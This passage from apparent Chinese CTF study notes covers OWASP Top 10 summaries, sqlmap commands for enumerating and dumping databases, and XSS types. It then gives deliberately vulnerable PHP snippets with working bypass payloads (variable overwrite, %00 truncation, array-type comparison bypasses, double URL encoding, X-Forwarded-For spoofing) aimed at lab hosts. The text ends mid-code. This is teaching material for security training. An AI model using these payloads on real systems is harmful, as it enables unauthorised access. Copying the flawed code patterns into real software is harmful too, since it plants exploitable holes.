Reference</h5><blockquote><p>当开发人员公开对内部实现对象(如文件、目录或数据库键)的引用时，就会出现直接对象引用。如果没有访问控制检查或其他保护，攻击者可以操纵这些引用来访问未经授权的数据。</p></blockquote><h5 id="A5-安全配置错误-Security-Misconfiguration"><a href="#A5-安全配置错误-Security-Misconfiguration" class="headerlink" title="A5 安全配置错误 Security Misconfiguration"></a>A5 安全配置错误 Security Misconfiguration</h5><blockquote><p>良好的安全性需要为应用程序、框架、应用服务器、web服务器、数据库服务器和平台定义和部署安全配置。默认值通常是不安全的。另外，软件应该保持更新。攻击者通过访问默认账户、未使用的网页、未安装补丁的漏洞、未被保护的文件和目录等，以获得对系统未授权的访问。</p></blockquote><h5 id="A6-敏感信息泄露-Sensitive-Data-Exposure"><a href="#A6-敏感信息泄露-Sensitive-Data-Exposure" class="headerlink" title="A6 敏感信息泄露 Sensitive Data Exposure"></a>A6 敏感信息泄露 Sensitive Data Exposure</h5><blockquote><p>保护与加密敏感数据已经成为网络应用的最重要的组成部分。最常见的漏洞是应该进行加密的数据没有进行加密。使用加密的情况下常见问题是不安全的密钥和使用弱算法加密。</p></blockquote><h5 id="A7-缺少功能级访问控制"><a href="#A7-缺少功能级访问控制" class="headerlink" title="A7 缺少功能级访问控制"></a>A7 缺少功能级访问控制</h5><blockquote><p>大多数web应用程序在实现UI中可见的功能之前，都要验证功能级别的访问权限。但是，当访问每个函数时，应用程序需要在服务器上执行相同的访问控制检查。如果请求没有得到验证，攻击者将能够伪造请求，以便在没有适当授权的情况下访问功能。</p></blockquote><h5 id="A8-跨站请求伪造-CSRF"><a href="#A8-跨站请求伪造-CSRF" class="headerlink" title="A8 跨站请求伪造 CSRF"></a>A8 跨站请求伪造 CSRF</h5><blockquote><p>利用了网站允许攻击者预测特定操作的所有细节这一特点。由于浏览器自动发送会话cookie等认证凭证，导致攻击者能够创建恶意的web页面来伪造请求。这些伪造的请求很难和合法的请求区分开。CSRF通过伪装来自受信任用户的请求来利用受信任的网站。</p></blockquote><h5 id="A9-使用含有已知漏洞的组件"><a href="#A9-使用含有已知漏洞的组件" class="headerlink" title="A9 使用含有已知漏洞的组件"></a>A9 使用含有已知漏洞的组件</h5><blockquote><p>开发人员使用的组件也会含有漏洞，这些漏洞能够被自动化工具发现和利用。然后攻击者根据需要定制攻击代码并实施攻击。</p></blockquote><h5 id="A10-未验证的重定向和转发"><a href="#A10-未验证的重定向和转发" class="headerlink" title="A10 未验证的重定向和转发"></a>A10 未验证的重定向和转发</h5><blockquote><p>应用程序经常将用户重定向到其他网页，或以类似的方式进行内部转发。当目标网页是通过一个未验证的参数来指定时，就容易被攻击者利用。攻击者通过诱使受害人去点击未经验证的重定向链接，从而利用不安全的转发绕过安全检测。攻击者通过重定向可以试图安装恶意软件或者诱使受害人泄露密码等敏感信息，通过转发可以绕过访问控制。</p></blockquote><p><a href="https://www.jianshu.com/p/1440c2035b28" rel="external nofollow" target="_blank">详细介绍</a></p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>在owasp发布的top 10漏洞里面，注入漏洞一直是危害排名第一，其中数据库注入漏洞是危害最大也是最受关注的漏洞。</p><p>当攻击者发送的sql语句被sql解释器执行，通过执行这些恶意语句欺骗数据库执行，导致数据库信息泄露。</p><h4 id="教程推荐"><a href="#教程推荐" class="headerlink" title="教程推荐"></a>教程推荐</h4><ul><li><p>看雪图书</p><p>1、<a href="https://www.kanxue.com/book-6-110.htm" rel="external nofollow" target="_blank">sql注入的原理与分类</a></p><p>2、<a href="https://www.kanxue.com/book-6-111.htm" rel="external nofollow" target="_blank">盲注</a></p><p>3、<a href="https://www.kanxue.com/book-6-112.htm" rel="external nofollow" target="_blank">DVWA SQL Injection分析与利用</a></p><p>4、<a href="https://www.kanxue.com/book-6-113.htm" rel="external nofollow" target="_blank">DVWA SQL Injection (Blind)分析与利用</a></p><p>5、<a href="https://www.kanxue.com/book-6-114.htm" rel="external nofollow" target="_blank">Sqlmap盲注利用</a></p><p>6、<a href="https://www.kanxue.com/book-6-115.htm" rel="external nofollow" target="_blank">防范sql注入</a></p></li></ul><h4 id="sqlmap安装"><a href="#sqlmap安装" class="headerlink" title="sqlmap安装"></a>sqlmap安装</h4><p><em>sqlmap</em>的使用需要<em>python</em>环境</p><p>1.python下载：<a href="https://www.python.org/downloads/" rel="external nofollow" target="_blank">官网</a></p><p>2.sqlmap下载：<a href="http://sqlmap.org/" rel="external nofollow" target="_blank">官网</a></p><blockquote><p>1.将下载的SQLMAP安装包解压到文件夹sqlmap中，并拷贝到 Python27 安装目录下</p><p>2.在文件夹下创建sqlmap.bat ,内容为cmd.exe，创建桌面快捷方式</p></blockquote><h4 id="sqlmap作用"><a href="#sqlmap作用" class="headerlink" title="sqlmap作用"></a>sqlmap作用</h4><p>1、判断可注入的参数</p><p>2、判断可以用那种SQL注入技术来注入</p><p>3、识别出哪种数据库</p><p>4、根据用户选择，读取哪些数据</p><p><strong>sqlmap支持五种不同的注入模式</strong>：</p><p>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</p><p>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p><p>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p><p>4、联合查询注入，可以使用union的情况下的注入。</p><p>5、堆查询注入，可以同时执行多条语句的执行时的注入。</p><p><strong>sqlmap支持的数据库有</strong>：</p><p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p><p>测试GET参数，POST参数，HTTP Cookie参数，HTTP User-Agent头和HTTP Referer头来确认是否有SQL注入，它也可以指定用逗号分隔的列表的具体参数来测试。</p><p>可以设定HTTP(S)请求的并发数，来提高盲注时的效率。</p><p>如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。</p><p>共有七个等级，默认为1：</p><p>0、只显示python错误以及严重的信息。</p><p>1、同时显示基本信息和警告信息。（默认）</p><p>2、同时显示debug信息。</p><p>3、同时显示注入的payload。</p><p>4、同时显示HTTP请求。</p><p>5、同时显示HTTP响应头。</p><p>6、同时显示HTTP响应页面。</p><p>如果你想看到sqlmap发送的测试payload最好的等级就是3。</p><p>更详细介绍<a href="https://www.jianshu.com/p/4fb15a2c9040" rel="external nofollow" target="_blank">参考博客</a></p><h4 id="sqlmap基本操作"><a href="#sqlmap基本操作" class="headerlink" title="sqlmap基本操作"></a>sqlmap基本操作</h4><ul><li><p>检测注入点</p><blockquote><p>sqlmap.py -u url</p></blockquote></li><li><p>所有数据库信息</p><blockquote><p>sqlmap.py -u url –dbs</p></blockquote></li><li><p>当前数据库信息</p><blockquote><p>sqlmap.py -u url –current-db</p></blockquote></li><li><p>指定库名列出所有表</p><blockquote><p>sqlmap.py -u url -D 库名 –table</p></blockquote></li><li><p>指定库名表名列出所有字段</p><blockquote><p>sqlmap.py -u url -D 库名 -T 表名 –columns</p></blockquote></li><li><p>指定库名表名字段dump</p><blockquote><p>sqlmap.py -u url -D 库名 -T 表名 -C 字段1,字段2 –dump</p></blockquote></li></ul><h5 id="CTF中的SQL注入"><a href="#CTF中的SQL注入" class="headerlink" title="CTF中的SQL注入"></a>CTF中的SQL注入</h5><p>1.练习总结博客：<a href="https://www.jianshu.com/p/17da91c3bdab" rel="external nofollow" target="_blank">站点</a></p><p>2.简单sql注入3：<a href="https://0xor-writeup.readthedocs.io/zh/latest/wargame/web/[shiyanbar.com]_simple_sql_injection_3/" rel="external nofollow" target="_blank">writeup</a></p><h3 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>CSS（Cross Site Scripting，跨站脚本攻击），为了和层叠样式表（Cascading Style Sheet，CSS）区分，所以安全领域改为叫XSS。<br>XSS攻击能让攻击者在受害者的浏览器中执行js脚本，并劫持用户会话、破坏网络或将用户重定向到其他恶意的站点。</p><h4 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h4><h5 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1. 反射型XSS"></a>1. 反射型XSS</h5><p>所谓反射型XSS，就是简单用户输入的数据‘反射’给浏览器。也就是说，黑客我那个网需要有事用户‘点击’一个恶意链接，才能攻击。这其实是比较被动的。</p><h5 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2. 存储型XSS"></a>2. 存储型XSS</h5><p>存储型XSS会把用户输入的数据‘存储’在服务器端。当访问数据库数据时，从数据库取出数据，并由HTML显示，这时导致了XSS的产生。</p><p>比如黑客将恶意js脚本写在一个博客中，下次任何人访问这个博客，都会在他们的浏览器中执行这段恶意js脚本。导致‘Cookie劫持’等。</p><h5 id="3-DOM型XSS"><a href="#3-DOM型XSS" class="headerlink" title="3. DOM型XSS"></a>3. DOM型XSS</h5><p>首先是关于DOM节点：<br>整个文档是一个文档节点 从每个 XML 标签是一个元素节点 包含在 XML 元素中的文本是文本节点 每一个 XML 属性是一个属性节点 注释属于注释节点。</p><p>HTML 文档中的所有内容都是节点：</p><ul><li>整个文档是一个文档节点</li><li>每个 HTML 元素是元素节点</li><li>HTML 元素内的文本是文本节点</li><li>每个 HTML 属性是属性节点</li><li>注释是注释节点</li></ul><p>和反射型XSS类似，但是这类XSS执行脚本的位置与反射型XSS不同，是修改了页面的DOM节点而造成了恶意js脚本的执行。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><table><thead><tr><th>XSS类型</th><th>反射型</th><th>存储型</th><th>DOM型</th></tr></thead><tbody><tr><td>触发过程</td><td>正常用户访问携带XSS的url</td><td>1.黑客构造XSS脚本2.用户访问有XSS脚本的网站</td><td>正常用户访问携带XSS的url</td></tr><tr><td>存储位置</td><td>url</td><td>数据库</td><td>url</td></tr><tr><td>谁来输出</td><td>后端web</td><td>后端web</td><td>前端JS</td></tr><tr><td>输出位置</td><td>HTML响应</td><td>HTML响应</td><td>动态生成的DOM节点</td></tr></tbody></table><h5 id="XSS在CTF中的运用"><a href="#XSS在CTF中的运用" class="headerlink" title="XSS在CTF中的运用"></a>XSS在CTF中的运用</h5><p>XSS在CTF中主要用于盗取<code>Cookie</code>和<code>Session</code>，然后利用<code>cookie</code>,做一些其他的事情，但是这是有CSP的，一般会考察<code>XSS绕过(bypass)</code>的能力。</p><p>另外还会涉及到<code>XSS</code>,<code>CSRF</code>，<code>SSRF</code>的综合应用。</p><p>再者，就是利用XSS漏洞，进行js脚本注入。</p><h5 id="参考文章-2"><a href="#参考文章-2" class="headerlink" title="参考文章"></a>参考文章</h5><p>1.<a href="https://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E4%BB%80%E4%B9%88%E6%98%AFXSS" rel="external nofollow" target="_blank">XSS原理&amp;复现</a><br>2.<a href="https://v0w.top/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&amp;%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/" rel="external nofollow" target="_blank">XSS攻击手段&amp;在CTF中的运用</a></p><h2 id="day03–Danie1"><a href="#day03–Danie1" class="headerlink" title="day03–Danie1"></a>day03–Danie1</h2><h3 id="php代码审计"><a href="#php代码审计" class="headerlink" title="php代码审计"></a>php代码审计</h3><h4 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h4><p><strong>该函数使用数组键名作为变量名，使用数组键值作为变量值。但是当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖漏洞。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag=<span class="string">'xxx'</span>; </span><br><span class="line">extract($_GET);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span><br><span class="line"> &#123; </span><br><span class="line">    $content=trim($flag);</span><br><span class="line">    <span class="keyword">if</span>($shiyan==$content)</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span><span class="string">'ctf&#123;xxx&#125;'</span>; </span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123; </span><br><span class="line">    <span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">   &#125; </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>file_get_contents — 将整个文件读入一个字符串。</p><p>trim — 去除字符串首尾处的空白字符（或者其他字符）。</p><ul><li>题目环境  <a href="http://172.16.43.117/php_bugs-master/01.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/01.php</a></li><li>payload <code>http://172.16.43.117/php_bugs-master/01.php?shiyan=1&amp;flag=1</code></li></ul><h4 id="多重加密"><a href="#多重加密" class="headerlink" title="多重加密"></a>多重加密</h4><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span><br><span class="line"><span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)&#123;<span class="keyword">echo</span> $flag;&#125;</span><br></pre></td></tr></table></figure><p>本地编写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>([<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>);</span><br><span class="line">$token = base64_encode(gzcompress(serialize($arr)));</span><br><span class="line">print_r($token);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行得到</p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080702.png" alt=""></p><p>即是所需的payload</p><h5 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>) <span class="comment">//strpos — 查找字符串首次出现的位置</span></span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>); </span><br><span class="line">       &#125;</span><br><span class="line">      &#125;</span><br><span class="line">     <span class="keyword">else</span> </span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>; </span><br><span class="line">      &#125;</span><br><span class="line">   &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p><ul><li><p>题目 <a href="http://172.16.43.117/php_bugs-master/05.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/05.php</a></p></li><li><p>限制条件</p><p>题中ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母</p></li></ul><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）</p><ul><li>解决方法</li></ul><p>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p><p>科学计数法绕过长度限制</p><ul><li>payload  <code>http://172.16.43.117/php_bugs-master/05.php?password=1e9%00*-*</code></li></ul><h4 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//比较两个字符串（区分大小写） </span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'No'</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以使用数组绕过</p><p>int strcmp ( string $str1 , string $str2 )<br>// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p><p>可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在<code>5.3</code>之前的php中，显示了报错的警告信息后，将<code>return 0</code> !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。<code>strcmp</code>只会处理字符串参数，如果给个数组的话呢，就会返回<code>NULL</code>,而判断使用的是<code>==</code>，<code>NULL==0</code>是 <code>bool(true)</code></p><p>题目 <a href="http://172.16.43.115/1.php" rel="external nofollow" target="_blank">http://172.16.43.115/1.php</a></p><p>payload： <code>?a[]=1</code></p><h4 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>限制条件</p><p>传入的name参数和password参数不能相同</p><p>但是它们的sha1值要相同</p><p>解决方法</p><p><code>===</code>会比较类型，比如<code>bool</code><br><code>sha1()</code>函数和<code>md5()</code>函数存在着漏洞，<code>sha1()</code>函数默认的传入参数类型是字符串型，那要是给它传入数组呢会出现错误，使<code>sha1()</code>函数返回错误，也就是返回<code>false</code>，这样一来<code>===</code>运算符就可以发挥作用了，需要构造<code>username</code>和<code>password</code>既不相等，又同样是数组类型</p><p>题目： <a href="http://172.16.43.117/php_bugs-master/07.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/07.php</a></p><p>payload：  <code>?name[]=1&amp;password[]=2</code></p><h4 id="SESSION验证绕过"><a href="#SESSION验证绕过" class="headerlink" title="SESSION验证绕过"></a>SESSION验证绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line">session_start(); </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'password'</span>] == $_SESSION[<span class="string">'password'</span>])</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&lt;p&gt;Wrong guess.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">mt_srand((microtime() ^ rand(<span class="number">1</span>, <span class="number">10000</span>)) % rand(<span class="number">1</span>, <span class="number">10000</span>) + rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>限制条件</p><p>传入的password参数要等于session中的password值</p><p>解决方法</p><p>删除session</p><p>题目： <a href="http://172.16.43.115/2.php" rel="external nofollow" target="_blank">http://172.16.43.115/2.php</a></p><p>payload  <code>http://172.16.43.115/2.php?password=</code></p><h4 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>题目：<a href="http://172.16.43.117/php_bugs-master/10.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/10.php</a></p><p>payload  <code>http://172.16.43.117/php_bugs-master/10.php?id=%2568ackerDJ</code></p><h4 id="X-Forwarded-For绕过指定IP地址"><a href="#X-Forwarded-For绕过指定IP地址" class="headerlink" title="X-Forwarded-For绕过指定IP地址"></a>X-Forwarded-For绕过指定IP地址</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>]))</span><br><span class="line">    $cip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>]))</span><br><span class="line">    $cip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</span><br><span class="line">    $cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    $cip = <span class="string">"0.0.0.0"</span>;</span><br><span class="line"><span class="keyword">return</span> $cip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$GetIPs = GetIP();</span><br><span class="line"><span class="keyword">if</span> ($GetIPs==<span class="string">"1.1.1.1"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Great! Key is *********"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"错误！你的IP不在访问列表之内！"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>题目：<a href="http://172.16.43.117/php_bugs-master/12.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/12.php</a></p><p>解决方法</p><p><code>HTTP</code>头添加<code>X-Forwarded-For:1.1.1.1</code></p><p>使用forefox插件<code>SIMPLE MODIFY HEADERS</code></p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080704.png" alt=""></p><h4 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 